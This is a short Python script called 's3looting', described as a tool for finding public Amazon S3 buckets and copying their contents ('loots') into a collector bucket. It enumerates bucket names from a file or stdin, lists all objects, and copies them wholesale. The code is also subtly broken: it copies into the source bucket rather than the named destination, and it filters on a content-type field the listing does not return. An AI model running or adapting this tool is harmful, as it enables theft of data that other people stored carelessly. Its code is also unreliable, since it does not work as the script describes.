#!/usr/bin/env python3
"""
s3looting is used to search for public buckets, download contents and upload to an S3 bucket
"""

from typing import List
import argparse
import sys

import boto3
from botocore.exceptions import ClientError

def main(args):
    # pylint: disable=C0103
    s3 = boto3.client('s3')

    # ensure destination is in tact
    try:
        s3.head_bucket(Bucket=args.bucket)
    except ClientError as ex:
        raise ex

    if args.content is not None:
        content_types = read_list(args.content)
    if args.list is None:
        try:
            buckets = sys.stdin.readlines()
        except Exception as ex:
            raise ex
    else:
        buckets = read_list(args.list)

    for bucket in buckets:
        bucket = bucket.strip()
        try:
            response = s3.head_bucket(Bucket=bucket)
            print('found public bucket: ', bucket)
        except ClientError as ex:
            raise ex

        for page in s3.get_paginator('list_objects_v2').paginate(Bucket=bucket):
            for obj in page['Contents']:
                res = s3.get_object(Bucket=bucket, Key=obj['Key'])
                if args.content is not None:
                    if obj['ContentType'] not in content_types:
                        continue
                if res['ContentLength'] > 5000000000:
                    print(f"{obj['Key']} is too large, skipping...")
                    continue
                print('copying ', obj['Key'])
                s3.copy_object(
                    Bucket=bucket,
                    Key=f"{bucket}-{obj['Key']}",
                    CopySource={'Bucket': bucket, 'Key': obj['Key']}
                )


def read_list(filename: str) -> List:
    try:
        with open(filename) as _f:
            return _f.read().splitlines()
    except FileNotFoundError as ex:
        raise ex


PARSER = argparse.ArgumentParser(description='S3 Looting')
PARSER.add_argument("-bucket", type=str, required=True,
                    help='destination for syncing loots')
PARSER.add_argument("-list", type=str, required=False,
                    help='file with list of bucket names to enumerate over')
PARSER.add_argument("-content", type=str, required=False,
                    help='file with list of content-types to download, otherwise it downloads any')
ARGS = PARSER.parse_args()
main(args=ARGS)
